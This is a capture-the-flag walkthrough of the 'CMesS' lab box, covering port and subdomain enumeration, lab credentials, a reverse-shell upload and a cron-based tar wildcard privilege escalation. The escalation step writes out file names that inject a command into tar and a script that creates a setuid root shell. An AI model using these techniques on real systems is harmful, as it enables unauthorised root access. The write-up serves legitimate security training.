# CMesS

> César Martínez | RedAiden

## Nmap scan

`nmap -sC -sV -O 10.10.98.228`

__nmap output:__
```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 02:3C:57:37:9B:B9 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster
`gobuster dir -u http://10.10.98.228 -w /usr/share/wordlists/dirb/big.txt`

__gobuster output:__
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 200)
/001 (Status: 200)
/0001 (Status: 200)
/01 (Status: 200)
/1 (Status: 200)
/1a2b3c (Status: 200)
/1_files (Status: 200)
/1sanjose (Status: 200)
/1qw23e (Status: 200)
/1qaz2wsx (Status: 200)
/1p2o3i (Status: 200)
/1x1 (Status: 200)
/1c (Status: 200)
/1q2w3e (Status: 200)
/About (Status: 200)
/Index (Status: 200)
/Search (Status: 200)
/about (Status: 200)
/admin (Status: 200)
/api (Status: 200)
/assets (Status: 301)
/author (Status: 200)
/blog (Status: 200)
/category (Status: 200)
/feed (Status: 200)
/fm (Status: 200)
/index (Status: 200)
/lib (Status: 301)
/log (Status: 301)
/login (Status: 200)
/robots.txt (Status: 200)
/search (Status: 200)
/server-status (Status: 403)
/sites (Status: 301)
/src (Status: 301)
/tags (Status: 200)
/tag (Status: 200)
/themes (Status: 301)
/tmp (Status: 301)
```

## wfuzz

`wfuzz -c -w /usr/share/wordlists/wfuzz/subdomains/subdomains-top1mil-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hl 107`

__wfuzz output:__
```
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 3024

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                   
===================================================================

000000001:   400        12 L     53 W     422 Ch      "~"                                                                                       
000000002:   400        12 L     53 W     422 Ch      "@"                                                                                       
000000252:   400        12 L     53 W     422 Ch      "asdfjkl;"                                                                                
000000566:   400        12 L     53 W     422 Ch      "cgi-bin/"                                                                                
000000827:   200        30 L     104 W    934 Ch      "dev"                                                                                     
000001640:   400        12 L     53 W     422 Ch      "lost+found"                                                                              
000002399:   400        12 L     53 W     422 Ch      "secció"                                                                                  

Total time: 11.88747
Processed Requests: 3024
Filtered Requests: 3017
Requests/sec.: 254.3853
```

## New found subdomain

Add the new subdomain to `/etc/hosts` with the same IP

Andre
email: andre@cmess.thm
password: KPFTN_f2yxe%

## Reverse shell

Upload a reverse shell php script and activate it in `cmess.thm/assets/yourscript.php`

## Linpeas

```
[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 161 Dec 29 18:24 /tmp/andre_backup.tar.gz                                                                                      
-rwxrwxrwx 1 www-data www-data 309748 Dec 29 18:17 /tmp/linpeas.sh
-rw-r--r-- 1 root root 16930 Feb  6  2020 /var/backups/apt.extended_states.0
```

## LinEnum
```
[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

[-] Location and Permissions (if accessible) of .bak file(s):
-rw-r--r-- 1 root root 3020 Feb  6  2020 /etc/apt/sources.bak
-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak
```

## Enumeration

1. Cat out `.password.bak` file: `cat /opt/.password.bak`
2. Save Andre's password
```
andres backup password
UQfsdCB7aAP6
```
3. Because of nmap we know it has ssh open, so we login as andre to ssh `ssh andre@[MACHINE IP]`
4. Paste in the found password
5. You are now Andre

## PrivEsc

1. Navigate to `backup`: `cd backup`
2. Create the malicious script: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh`
3. Make it executible `chmod +x runme.sh`
4. Make the tar commands:
```bash
touch /home/andre/backup/--checkpoint=1
touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh
```
5. Wait 30 seconds
6. Run bash: `/tmp/bash -p`. You are now root.
7. Print the flag `cat /root/root.txt`
